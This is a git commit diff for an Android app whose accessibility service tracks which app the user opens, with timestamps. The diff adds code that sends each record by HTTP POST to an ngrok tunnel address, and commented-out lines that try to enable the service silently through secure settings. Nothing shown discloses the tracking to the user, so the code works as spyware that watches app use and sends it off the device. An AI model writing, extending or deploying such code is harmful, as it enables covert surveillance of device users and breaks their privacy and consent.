2f7ad77117e2f58dafb3d50c0c9272a5d04c77f7
Trung Anh Nguyen <75680813+TrungAnhNguyen2k2@users.noreply.github.com>
2024-02-19 07:15:55 +0700

    final

--- app/src/main/java/com/example/myapplication/MainActivity.java
+++ app/src/main/java/com/example/myapplication/MainActivity.java
@@ -5,8 +5,11 @@ import androidx.appcompat.app.AppCompatActivity;
 import android.content.Intent;
 import android.os.Bundle;
 import android.provider.Settings;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
+
+import java.io.DataOutputStream;
 
 public class MainActivity extends AppCompatActivity {
     private Button allowPermission;
@@ -19,8 +22,12 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onClick(View v) {
                 startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+//                Settings.Secure.putString(getContentResolver(),
+//                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, "com.example.myapplication/MyAccessibilityService");
+//                Settings.Secure.putString(getContentResolver(),
+//                        Settings.Secure.ACCESSIBILITY_ENABLED, "1");
             }
         });
-
     }
+
 }
--- app/src/main/java/com/example/myapplication/MyAccessibilityService.java
+++ app/src/main/java/com/example/myapplication/MyAccessibilityService.java
@@ -6,42 +6,101 @@ import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.util.Log;
+
+import java.io.IOException;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
 import java.time.LocalDateTime;
+import java.util.concurrent.Executor;
+import java.util.concurrent.Executors;
 
 
 public class MyAccessibilityService extends AccessibilityService {
-    private static final String TAG="MyAccessibilityService";
+    private static final String TAG = "MyAccessibilityService";
+//    private class SendToServerTask extends Executor{
+//
+//    }
+private Executor executor = Executors.newSingleThreadExecutor();
+
+    private class SendToServerTask implements Runnable {
+        private String data;
+        public SendToServerTask(String data) {
+            this.data = data;
+        }
+        @Override
+        public void run() {
+            try {
+                String webhookUrl = "https://13a9-118-68-122-101.ngrok-free.app";
+                // Tạo đối tượng URL từ đường dẫn URL
+                URL url = new URL(webhookUrl);
+                // Mở kết nối HTTP
+                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                // Thiết lập phương thức là POST
+                connection.setRequestMethod("POST");
+                // Thiết lập header
+                connection.setRequestProperty("Content-Type", "application/text");
+                // Cho phép viết dữ liệu đến connection
+                connection.setDoOutput(true);
+                // Gửi dữ liệu thông điệp dạng byte array
+                byte[] messageBytes = data.getBytes(StandardCharsets.UTF_8);
+                try (OutputStream os = connection.getOutputStream()) {
+                    os.write(messageBytes, 0, messageBytes.length);
+                }
+                // Lấy mã phản hồi từ server
+                int responseCode = connection.getResponseCode();
+                // Log thông báo khi thực hiện thành công
+                Log.d("RESPONSE FROM SERVER","Response Code"+ String.valueOf(responseCode) );
+                // Đóng kết nối
+                connection.disconnect();
+            } catch (Exception e) {
+                // Xử lý ngoại lệ nếu có
+                Log.e("Deo On R",e.toString());
+            }
+        }
+    }
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-//        Log.d(TAG, "onAccessibilityEvent");
-        String packageName= event.getPackageName().toString();
-        PackageManager packageManager= this.getPackageManager();
+        Log.d(TAG, "onAccessibilityEvent");
+        String packageName = event.getPackageName().toString();
+        PackageManager packageManager = this.getPackageManager();
         LocalDateTime currentTime = null;
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
             currentTime = LocalDateTime.now();
         }
         try {
-            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName,0);
+            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
             CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);
-            Log.i(TAG, currentTime+ " APP:"+ applicationLabel);
-        } catch (PackageManager.NameNotFoundException e) {
-            throw new RuntimeException(e);
+            if (!"Pixel Launcher".equals(applicationLabel.toString())) {
+                String msg = currentTime + " APP:" + applicationLabel;
+                Log.i(TAG, msg);
+                executeSendToServerTask(msg);
+            }
+        } catch (Exception e) {
+            Log.e("Ko dc r",e.toString());
         }
     }
+
     @Override
     public void onInterrupt() {
-        Log.e(TAG,"INTERUPT");
+        Log.e(TAG, "INTERUPT");
     }
 
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
-        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED|
-                AccessibilityEvent.TYPE_VIEW_FOCUSED;
+//        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
+//                AccessibilityEvent.TYPE_VIEW_FOCUSED|AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
+        info.eventTypes=AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
         info.notificationTimeout = 100;
         this.setServiceInfo(info);
-        Log.d(TAG,"onServiceConnected:");
+        Log.d(TAG, "onServiceConnected:");
+    }
+    private void executeSendToServerTask(String data) {
+        executor.execute(new SendToServerTask(data));
     }
 }
